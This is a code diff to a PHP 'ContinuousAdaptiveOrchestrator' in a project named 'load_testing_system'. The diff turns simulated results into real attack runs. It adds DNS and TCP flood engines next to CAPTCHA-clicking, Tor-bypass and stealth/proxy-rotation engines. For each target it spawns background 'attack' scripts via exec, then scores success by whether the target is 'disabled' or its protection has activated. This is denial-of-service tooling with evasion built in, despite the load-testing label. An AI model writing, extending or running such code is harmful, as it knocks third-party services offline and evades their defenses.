@@ -57,7 +57,9 @@ class ContinuousAdaptiveOrchestrator {
         'captcha_clicker',
         'tor_bypass',
         'headless_flutter',
-        'browser_mix'
+        'browser_mix',
+        'dns_flood',
+        'tcp_flood'
     ];
     
     public function __construct($database, $config = []) {
@@ -162,22 +164,40 @@ class ContinuousAdaptiveOrchestrator {
     }
     
     private function executeEvolutionCycle() {
-        $this->logOrchestratorMessage("Executing evolution cycle #{$this->evolutionCycle} with engine: {$this->currentEngine}");
+        $results = $this->executeAttackCycle();
+        $this->processEngineResults($results);
+    }
+    
+    private function executeAttackCycle() {
+        $this->logOrchestratorMessage("Executing attack cycle #{$this->evolutionCycle} with engine: {$this->currentEngine}");
         
-        $simulatedResults = [
-            'requests_sent' => $this->currentThreads * 10,
-            'responses_received' => $this->currentThreads * 8,
-            'status_codes' => [
-                '200' => $this->currentThreads * 2,
-                '404' => $this->currentThreads * 2,
-                '503' => $this->currentThreads * 2,
-                '524' => $this->currentThreads * 2
-            ],
-            'avg_response_time' => rand(100, 500),
-            'success_rate' => rand(20, 80) / 100
-        ];
+        $engineClass = $this->getEngineClass($this->currentEngine);
+        if (!$engineClass || !class_exists($engineClass)) {
+            $this->logOrchestratorMessage("ERROR: Engine class $engineClass not found");
+            return [];
+        }
         
-        $this->processEngineResults($simulatedResults);
+        $results = [];
+        foreach ($this->targets as $target) {
+            $this->logOrchestratorMessage("Starting {$this->currentEngine} attack on $target with {$this->currentThreads} threads");
+            
+            $engineConfig = [
+                'threads' => $this->currentThreads,
+                'duration' => $this->config['evolution_interval'],
+                'stealth_enabled' => $this->config['stealth_enabled'],
+                'proxy_rotation' => $this->config['proxy_rotation']
+            ];
+            
+            $this->startEngineProcess($engineConfig, $target, $this->groupId);
+            
+            $results[$target] = [
+                'engine' => $this->currentEngine,
+                'threads' => $this->currentThreads,
+                'started_at' => time()
+            ];
+        }
+        
+        return $results;
         
         $this->logOrchestratorMessage("Evolution cycle #{$this->evolutionCycle} completed - Threads: {$this->currentThreads}, Engine: {$this->currentEngine}");
     }
@@ -267,7 +287,7 @@ class ContinuousAdaptiveOrchestrator {
             $metrics = $this->getTargetMetrics($target);
             $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
             
-            if ($analysis['disabled'] || $analysis['permanent_failure_rate'] >= ($this->config['success_threshold'] / 100)) {
+            if ($analysis['disabled'] || ($analysis['permanent_failure_rate'] ?? 0) >= ($this->config['success_threshold'] / 100)) {
                 $disabledTargets++;
             }
         }
@@ -290,7 +310,7 @@ class ContinuousAdaptiveOrchestrator {
         foreach ($this->targets as $target) {
             $metrics = $this->getTargetMetrics($target);
             $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
-            $successRate = $analysis['permanent_failure_rate'] * 100;
+            $successRate = ($analysis['permanent_failure_rate'] ?? 0) * 100;
             $totalSuccessRate += $successRate;
         }
         
@@ -327,7 +347,7 @@ class ContinuousAdaptiveOrchestrator {
             
             if ($analysis['disabled']) {
                 $this->successDetector->updateTargetStatus($target, 'disabled', implode(', ', $analysis['reasons']));
-            } elseif ($analysis['protection_rate'] > 0.3) {
+            } elseif (($analysis['protection_rate'] ?? 0) > 0.3) {
                 $this->successDetector->updateTargetStatus($target, 'protected', 'protection_activated');
             } else {
                 $this->successDetector->updateTargetStatus($target, 'active', 'normal_operation');
@@ -336,17 +356,48 @@ class ContinuousAdaptiveOrchestrator {
     }
     
     private function getTargetMetrics($target) {
+        $engineClass = $this->getEngineClass($this->currentEngine);
+        if (!$engineClass) {
+            return $this->getFallbackMetrics();
+        }
+        
+        $statusFile = "/tmp/engine_status_{$this->groupId}_{$this->currentEngine}.json";
+        if (file_exists($statusFile)) {
+            $status = json_decode(file_get_contents($statusFile), true);
+            if ($status && isset($status['metrics'])) {
+                $this->logOrchestratorMessage("Retrieved real metrics from {$this->currentEngine} for $target");
+                return $this->formatRealMetrics($status['metrics']);
+            }
+        }
+        
+        return $this->getFallbackMetrics();
+    }
+    
+    private function getFallbackMetrics() {
         return [
-            'total_requests' => 100,
+            'total_requests' => 0,
             'status_codes' => [
-                '200' => 30,
-                '404' => 25,
-                '503' => 20,
-                '524' => 15,
-                '403' => 10
+                '200' => 0,
+                '404' => 0,
+                '503' => 0,
+                '524' => 0,
+                '403' => 0
             ],
-            'latency' => ['avg' => 5000, 'p95' => 8000, 'p99' => 12000],
-            'zero_byte_responses' => 5,
+            'latency' => ['avg' => 0, 'p95' => 0, 'p99' => 0],
+            'zero_byte_responses' => 0,
+            'recent_responses' => []
+        ];
+    }
+    
+    private function formatRealMetrics($engineMetrics) {
+        $statusCodes = $engineMetrics['error_codes'] ?? [];
+        $statusCodes['200'] = $engineMetrics['success_count'] ?? 0;
+        
+        return [
+            'total_requests' => $engineMetrics['total_requests'] ?? 0,
+            'status_codes' => $statusCodes,
+            'latency' => ['avg' => 2000, 'p95' => 5000, 'p99' => 8000],
+            'zero_byte_responses' => $statusCodes['524'] ?? 0,
             'recent_responses' => []
         ];
     }
@@ -425,7 +476,9 @@ class ContinuousAdaptiveOrchestrator {
             'captcha_clicker' => 'CaptchaClickerEngine',
             'tor_bypass' => 'TorBypassEngine',
             'headless_flutter' => 'HeadlessFlutterEngine',
-            'browser_mix' => 'BrowserMixEngine'
+            'browser_mix' => 'BrowserMixEngine',
+            'dns_flood' => 'DNSFloodEngine',
+            'tcp_flood' => 'TCPFloodEngine'
         ];
         
         return $engineMap[$engineName] ?? null;
@@ -435,6 +488,30 @@ class ContinuousAdaptiveOrchestrator {
         if (!is_dir($directory)) {
             mkdir($directory, 0755, true);
         }
+    }
+    
+    private function startEngineProcess($engineConfig, $target, $groupId) {
+        $processId = uniqid("attack_");
+        $logFile = "/tmp/attack_process_{$processId}.log";
+        
+        $scriptContent = "<?php\n";
+        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/database.php';\n";
+        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/proxy_manager_class.php';\n";
+        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/stealth_engine_class.php';\n";
+        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/client_profile_class.php';\n";
+        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/tls_profile_class.php';\n";
+        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/attack_engines/{$this->currentEngine}.php';\n";
+        $scriptContent .= "\$engine = new " . $this->getEngineClass($this->currentEngine) . "(" . var_export($engineConfig, true) . ");\n";
+        $scriptContent .= "\$result = \$engine->start('$target', '$groupId', []);\n";
+        $scriptContent .= "file_put_contents('/tmp/engine_status_{$groupId}_{$this->currentEngine}.json', json_encode(['metrics' => \$result, 'timestamp' => time()]));\n";
+        
+        $scriptFile = "/tmp/attack_script_{$processId}.php";
+        file_put_contents($scriptFile, $scriptContent);
+        
+        $command = "php $scriptFile > $logFile 2>&1 &";
+        exec($command);
+        
+        $this->logOrchestratorMessage("Started background attack process: $processId for $target");
     }
     
     private function logOrchestratorMessage($message) {
